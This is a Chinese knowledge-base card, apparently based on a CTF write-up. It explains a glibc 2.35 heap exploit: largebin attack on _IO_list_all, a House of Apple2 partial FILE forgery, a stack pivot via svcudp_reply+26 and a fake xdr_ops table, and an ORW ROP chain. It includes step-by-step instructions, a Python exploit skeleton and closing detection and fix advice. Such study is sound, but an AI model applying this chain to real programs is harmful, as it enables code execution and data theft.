---
id: binary-pwn-heap-house-of-apple2-chunk-header-svcudp-reply-xdr-ops-orw
title: House of Apple2 部分覆盖 chunk header：_wide_data 错位修正 + svcudp_reply+26 经 fake xdr_ops 栈迁移 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-apple2-chunk-header-svcudp-reply-xdr-ops-orw
tags:
- pwn
- heap
- glibc235
- fsop
- house-of-apple2
- io-list-all
- largebin
- svcudp-reply
- stack-pivot
- orw
- protobuf
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V155
  verified_at: '2026-11-06T07:48:44+08:00'
  notes: 已对照原文全文核对：edit堆溢出、双泄露偏移0x21b0d0、largebin bk_nextsize=_IO_list_all-0x20、file_addr=heap+0x6180 chunk header、partial FILE从+0x10、_wide_data=+0x8、_wide_vtable=+0x78、svcudp_reply+26(0x16a0da)、[fp+0x48]→chunk0→[+0x18]→xdr_ops→[+0x28] leave;ret、close(0)+ORW均与原文exp一致。未验证点：原文未附flag输出截图，卡内已注明偏移仅适配其本地glibc 2.35，未复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-apple2-chunk-header-svcudp-reply-xdr-ops-orw/
draft: false
kb_aliases:
- House of Apple2 chunk header
- _IO_list_all 指向 chunk header
- svcudp_reply+26
- fake xdr_ops 栈迁移
- partial FILE 覆盖
- protobuf 堆题
---

## 一句话结论

在 glibc 2.35 上，用 largebin attack 把 `_IO_list_all` 改到堆上大 chunk 的 **chunk header** 后，从 `file_addr + 0x10` 开始伪造 partial `_IO_FILE` 走 House of Apple2；把 `_wide_vtable + 0x68` 的 `__doallocate` 槽填成 `svcudp_reply+26`，利用 `[fp+0x48] → rbp=chunk0`、`[rbp+0x18] → fake xdr_ops`、`[rax+0x28] → leave;ret` 三级解引用完成栈迁移，最后用 ORW 读 flag。

## 原理

- 入口是 `edit` 堆溢出：`edit` 直接相信本次传入的 `size`，不校验它是否仍小于该 chunk 当初申请的大小，于是可把小块当大块写，覆盖相邻 chunk header 与数据；配合 `show` 的越界读取可先泄露 libc、再泄露 heap。
- 拿到 libc/heap 后做 largebin attack：伪造一个 `0x430` 的 free chunk，把 `bk_nextsize` 设为 `_IO_list_all - 0x20`；largebin 插入时执行 `victim->bk_nextsize->fd_nextsize = victim`，由于 `fd_nextsize` 在 chunk + 0x20，最终写入 `_IO_list_all = victim`。victim 是堆上大 chunk 的 **chunk header**，不是正常 `FILE` 起点。
- 因为 `_IO_list_all` 指向 chunk header，`FILE + 0x0` 被 chunk header 的 `prev_size`/`size` 占据：把第一格设成 `_flags = 0xfbad0000`（保留 `_IO_MAGIC` 并清掉 `_IO_CURRENTLY_PUTTING(0x800)`），第二格设成 `size = 0x421`；真正的 fake `FILE` 从 `file_addr + 0x10` 开始，字段整体后移 0x10，这是后面所有“差 0x8/0x10”问题的根源。
- `_wide_data` 不能指 `file_addr`，要指 `file_addr + 0x8`：解释起点吃到 chunk header 的两个 qword 后，后移一个 qword 才能让 `_IO_write_base / _IO_write_ptr / _IO_write_end` 重新对齐到 0 / 1 / 0，满足 `_IO_flush_all_lockp` 的刷新条件。
- `_wide_vtable` 要满足 `(_wide_vtable + 0x68) = magic_gadget`。当前布局把 `magic_gadget` 放在 `file_addr + 0xe0`，所以 `_wide_vtable = file_addr + 0x78`；tail 的三个 qword 顺序必须是“主 vtable → magic_gadget → _wide_vtable”，写反就会把 gadget 本身当成 `_wide_vtable` 指针。
- 触发路径：`exit → _IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf → *(_wide_vtable + 0x68)(fp)`。把该槽填成 glibc 2.35 的 `svcudp_reply + 26`（示例 libc 偏移 `0x16a0da`），它按以下指令消费 fake `FILE`：
  - `+26: mov rbp, [rdi + 0x48]`：`fp + 0x48` 是 `_IO_save_base`，提前写成 `chunk0`，于是 `rbp = chunk0`；
  - `+30: mov rax, [rbp + 0x18]`：`chunk0 + 0x18` 写 fake `xdr_ops` 地址，于是 `rax = fake_xdr_ops`；
  - `+34: lea r13, [rbp + 0x10]`；`+38: mov dword [rbp+0x10], 0`；`+45: mov rdi, r13`；
  - `+48: call [rax + 0x28]`：`struct xdr_ops` 的 `x_setpostn` 槽，填 `leave; ret`。
- `leave; ret` 执行时 `rsp = rbp = chunk0`，`pop rbp` 消费 `chunk0+0`（放 `"./flag\0\0"`），`ret` 跳到 `chunk0+8`（放 `add rsp,0x18; ret`），`rsp` 被抬到 `chunk0+0x28`，正好跳过被 `svcudp_reply` 清零的 `chunk0+0x10` 和存 fake `xdr_ops` 指针的 `chunk0+0x18`。真正 ROP 从 `chunk0+0x28` 开始。
- fake `xdr_ops` 不需要整表：本路径只命中 `x_setpostn`（偏移 `+0x28`），构造 0x48 字节表只填这一格即可。
- ORW 先 `close(0)`，让后面的 `open("./flag", O_RDONLY)` 尽量拿回 fd 0，随后固定用 `read(0, buf, 0x50)` / `write(1, buf, 0x50)`，避免猜测 open 返回值。

## 触发条件

- glibc 2.35（原文本地环境；示例偏移 `svcudp_reply+26 = libc+0x16a0da`、`_IO_wfile_jumps`、`_IO_stdfile_2_lock` 等随 libc 构建变化，需按目标 libc 重新核对）。
- 存在可反复触发、且 `size` 不受原 chunk 大小约束的 `edit` 堆溢出，并有 `show` 类越界读取原语。
- 能申请/释放足够大的 chunk（示例 0x420/0x410，fake victim 0x430）并推动其从 unsorted 进入 largebin。
- 已知 libc 与 heap 基址；能把 partial `FILE`、`chunk0` ORW 控制区写到可预测的堆地址。
- 程序最终通过 `exit()` 或 main 返回触发 `_IO_flush_all_lockp`。

## 利用步骤

1. 恢复协议与交互：程序先读 4 字节小端长度，再读 protobuf 正文；消息字段为 `option=1/2/3/4/5` 对应 add/free/edit/show/exit，`chunk_sizes`、`heap_chunks_id`、`heap_content`。长度头用 `p32`，`repeated` 字段用 append/extend 而不是标量覆盖。
2. 堆风水：连续 `add(0x420)` 四块、`add(0x410)` 三块，固定相邻关系；`free(3)` 后从 chunk2 溢出改写 chunk3/4 的 header，制造可越界 `show` 的观察窗口。
3. 双泄露：`edit(2, 0x420+0x10, b'a'*0x420 + b'@'*0x10)`，`show(2)` 对齐 `@` 标记后读出 unsorted bin 中的 `main_arena` 指针，算 libc 基址；再把边界后推，用同一手法泄露 heap 指针并还原 heap 基址。
4. largebin 写 `_IO_list_all`：用 chunk2 溢出构造 `0x430/0x431` fake chunk、`bk_nextsize = _IO_list_all - 0x20`；`free(5)` 后 `add(0x4f0)` 推动 largebin 整理，确认 `p _IO_list_all` 已指向 `file_addr = heap + 0x6180`（chunk header）。
5. 布置 `chunk0` ORW 控制区（示例 `heap + 0x22f0`）：`+0` 放 `"./flag\0\0"`，`+8` 放 `add rsp,0x18; ret`，`+0x10` 留空（会被清零），`+0x18` 放 `fake_xdr_ops_addr`，`+0x28` 起放 `leave;ret` + ORW ROP；在 `chunk0+0x230` 放只填 `+0x28` 的 fake `xdr_ops`（值为 `leave;ret`）。
6. 布置 partial `FILE`：`edit(4, 0x410+0x10+len(fake_io), b'a'*0x410 + p64(0xfbad0000) + p64(0x421) + fake_io)`；`fake_io` 从 `file_addr+0x10` 开始，按 `_IO_read_end ... _IO_save_base=chunk0 ... _wide_data=file_addr+0x8 ... _mode` 填充，`ljust(0xc8)` 后依次放 `_IO_wfile_jumps`、`magic_gadget`、`wide_vtable_addr`。
7. 发送 exit（菜单 5）触发 `exit → _IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf → svcudp_reply+26 → leave;ret → ORW`。
8. 调试顺序：先验证协议/菜单；再验证双泄露；然后 `p _IO_list_all` 确认 largebin 结果；再在 `exit`、`_IO_flush_all_lockp`、`_IO_wfile_overflow`、`_IO_wdoallocbuf` 下断；最后在 `svcudp_reply+26/+30/+48` 分别检查 `rdi/rbp/rax` 三级指针。

## PoC

以下是关键布局骨架（偏移以原文 glibc 2.35 环境为准，换 libc 必须重新确认）：

```python
# 已获得 libc / heap 基址
file_addr   = heap + 0x6180      # _IO_list_all 指向的 chunk header
chunk0      = heap + 0x22f0      # ORW 控制区
wide_data   = file_addr + 0x8    # 让 _IO_write_base/_ptr/_end 对齐到 0/1/0
wide_vtable = file_addr + 0x78   # +0x68 => file_addr + 0xe0
magic_gadget = lib + 0x16a0da    # svcudp_reply+26

# 1) chunk0：伪 XDR + ORW
orw  = b"./flag\x00\x00" + p64(add_rsp18) + p64(0) + p64(chunk0 + 0x230)
orw += p64(leave_ret)
orw += p64(pop_rdi) + p64(0) + p64(close_addr)          # close(0)
orw += p64(pop_rdi) + p64(chunk0)
orw += p64(pop_rsi) + p64(0)
orw += p64(pop_rax) + p64(2) + p64(syscall)             # open("./flag", 0)
orw += p64(pop_rdi) + p64(0)
orw += p64(pop_rsi) + p64(chunk0 + 0x100)
orw += p64(pop_rdx12) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi) + p64(1)
orw += p64(pop_rsi) + p64(chunk0 + 0x100)
orw += p64(pop_rdx12) + p64(0x50) + p64(0) + p64(write_addr)
support = bytearray(orw).ljust(0x230, b"\x00")
support[0x230 + 0x28:0x230 + 0x30] = p64(leave_ret)     # x_setpostn
edit(0, len(support), bytes(support))

# 2) partial FILE：从 file_addr+0x10 开始
fake  = p64(0) + p64(0) + p64(0)      # _IO_read_end/_IO_read_base/_IO_write_base
fake += p64(1) + p64(0) + p64(0) + p64(0)  # _IO_write_ptr=1 起，满足 flush 条件
fake += p64(chunk0)                   # +0x48 _IO_save_base -> rbp
fake += p64(0) * 4 + p32(2) + p32(0)  # _chain/_fileno/_flags2
fake += p64(0xffffffffffffffff)       # _old_offset
fake += p16(0) + b"\x00" + b"\n" + p32(0)
fake += p64(_IO_stdfile_2_lock) + p64(0xffffffffffffffff)
fake += p64(0) + p64(wide_data)       # _codecvt, _wide_data
fake += p64(0) * 3 + p32(0xffffffff) + b"\x00" * 19
fake  = fake.ljust(0xc8, b"\x00")
fake += p64(lib + libc.sym["_IO_wfile_jumps"])
fake += p64(magic_gadget)             # file_addr + 0xe0
fake += p64(wide_vtable)              # file_addr + 0xe8

hdr  = b"a" * 0x410 + p64(0xfbad0000) + p64(0x421)  # 清 _IO_CURRENTLY_PUTTING(0x800)
edit(4, len(hdr + fake), hdr + fake)
quit_menu()                           # exit -> FSOP -> svcudp_reply -> ORW
```

原文完整 exp 还包括 protobuf 封装、largebin 双泄露与 `edit(2, ...)` 的具体 payload；上面只保留决定链能否走通的结构。

## 变体与关联

- 关联：[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（覆盖完整 `_IO_2_1_stderr_` 的 House of Apple2，`_IO_list_all` 指向正常 FILE 起点，不存在 chunk header 的 +0x10 错位）；本卡是 `_IO_list_all` 指向堆 chunk header 的 partial 版本。
- 关联：[[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]（同样用 largebin 改 `_IO_list_all`，但走 `setcontext+0x3d` 恢复上下文）；本卡改用 `svcudp_reply+26` + fake `xdr_ops`，适合没有 `setcontext` 可用偏移或想减少 ROP 布置的场景。
- 变体：magic gadget 不限于 `svcudp_reply+26`；其他会从 `FILE` 字段取指针再间接调用的 libc 函数理论上都可替换，但要满足同样的“可控 `rbp`/`rax`/call 槽”三级结构。
- 变体：若 `_IO_list_all` 被写到正常 FILE 起点而非 chunk header，`_wide_data`/`_wide_vtable` 的 +0x8 修正不再需要，tail 布局也要整体回退 0x10。
- 关联：[[code-analysis-reverse-linux-protobuf-c-descriptor-recovery]]（protobuf 协议逆向方法，可复用在本类长度前缀 + protobuf 的 pwn 题）。
- 边界：原文是 CTF 题解，给出完整 exp 与调试顺序，但未附 flag 输出截图；所有偏移针对其本地 glibc 2.35 与目标二进制，换环境需重新定位。

## 检测与防御

- 检测：退出阶段出现 `_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf` 异常调用栈；`_IO_list_all` 指向堆地址且该地址前 0x10 字节呈 chunk header 形态；`_wide_vtable` 落在堆上而非 libc 的 `__libc_IO_vtables` 段；进程退出前出现从堆 pivot 的 ORW syscall 链。
- 修复：在 `edit` 入口记录每个 chunk 的原始申请大小，写入前强制 `size <= original_size`；对 `show` 的输出长度同样按原始大小截断。
- 加固：升级 glibc 并跟进 FSOP/`_wide_vtable` 校验；启用堆元数据完整性检查与 ASan；Full RELRO/PIE/NX 不能阻止本链，不能替代堆安全。
- 防御：seccomp 仅允许 ORW 时，限制可打开路径与读取长度，并监控异常的 `open/read/write` 组合；根本仍是消除堆溢出与越界读。
